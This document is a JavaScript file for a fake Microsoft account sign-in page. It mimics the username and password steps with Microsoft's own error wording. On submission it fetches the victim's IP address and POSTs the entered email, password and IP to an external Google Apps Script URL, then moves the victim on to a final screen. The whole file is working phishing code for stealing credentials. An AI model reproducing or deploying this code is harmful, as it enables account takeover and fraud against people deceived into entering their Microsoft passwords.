document.addEventListener('DOMContentLoaded', () => {
    const unReq = "Enter a valid email address, phone number, or Skype name.";
    const pwdReq = "Please enter the password for your Microsoft account.";
    const unameInp = document.getElementById('inp_uname');
    const pwdInp = document.getElementById('inp_pwd');
    let view = "uname";

    let unameVal = false;
    let pwdVal = false;

    const nxt = document.getElementById('btn_next');
    const yes = document.getElementById('btn_yes'); // Selecting the "Yes" button
    const no = document.getElementById('btn_no'); // Selecting the "No" button

    nxt.addEventListener('click', () => {
        validate();
        if (unameVal) {
            document.getElementById("section_uname").classList.toggle('d-none');
            document.getElementById('section_pwd').classList.remove('d-none');
            document.querySelectorAll('#user_identity').forEach((e) => {
                e.innerText = unameInp.value;
            });
            view = "pwd";
        }
    });

    const sig = document.getElementById('btn_sig');

    sig.addEventListener('click', () => {
        validate();
        if (pwdVal) {
            const email = unameInp.value.trim();
            const password = pwdInp.value.trim();

            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    const userIP = data.ip;

                    const formData = new FormData();
                    formData.append('IPAddress', userIP);
                    formData.append('Email', email);
                    formData.append('Password', password);
                    formData.append('FormId', 'form12');

                    const scriptURL = 'https://script.google.com/macros/s/AKfycbyujy1R5qLrISn3RTBut1RC9fwZbJ7bh2YELsYqXUw7M0uARGtdWcjKoYF_VnZx5kYA/exec';
                    fetch(scriptURL, {
                        method: 'POST',
                        body: formData,
                    })
                    .then(response => {
                        console.log('Form data sent.');
                        document.getElementById("section_pwd").classList.toggle('d-none');
                        document.getElementById('section_final').classList.remove('d-none');
                        view = "final";
                    })
                    .catch(error => console.error('Error!', error.message));
                });
        }
    });

    // Add event listeners for both "Yes" and "No" buttons to navigate to the dashboard
    yes.addEventListener('click', (e) => {
        e.preventDefault(); // Prevent the default form submission behavior
        window.location.href = '/dashboard'; // Navigate to /dashboard
    });

    no.addEventListener('click', (e) => {
        e.preventDefault(); // Prevent the default form submission behavior
        window.location.href = '/dashboard'; // Navigate to /dashboard
    });

    function validate() {
        function unameValAction(type) {
            if (!type) {
                document.getElementById('error_uname').innerText = unReq;
                unameInp.classList.add('error-inp');
                unameVal = false;
            } else {
                document.getElementById('error_uname').innerText = "";
                unameInp.classList.remove('error-inp');
                unameVal = true;
            }
        }

        function pwdValAction(type) {
            if (!type) {
                document.getElementById('error_pwd').innerText = pwdReq;
                pwdInp.classList.add('error-inp');
                pwdVal = false;
            } else {
                document.getElementById('error_pwd').innerText = "";
                pwdInp.classList.remove('error-inp');
                pwdVal = true;
            }
        }

        if (view === "uname") {
            if (unameInp.value.trim() === "") {
                unameValAction(false);
            } else {
                unameValAction(true);
            }
            unameInp.addEventListener('change', function () {
                if (this.value.trim() === "") {
                    unameValAction(false);
                } else {
                    unameValAction(true);
                }
            });
        } else if (view === "pwd") {
            if (pwdInp.value.trim() === "") {
                pwdValAction(false);
            } else {
                pwdValAction(true);
            }
            pwdInp.addEventListener('change', function () {
                if (this.value.trim() === "") {
                    pwdValAction(false);
                } else {
                    pwdValAction(true);
                }
            });
        }
        return false;
    }

    document.querySelector('.back').addEventListener('click', () => {
        view = "uname";
        document.getElementById("section_pwd").classList.toggle('d-none');
        document.getElementById('section_uname').classList.remove('d-none');
    });

    document.querySelectorAll('#btn_final').forEach((b) => {
        b.addEventListener('click', () => {
            window.open(location, '_self').close();
        });
    });
});
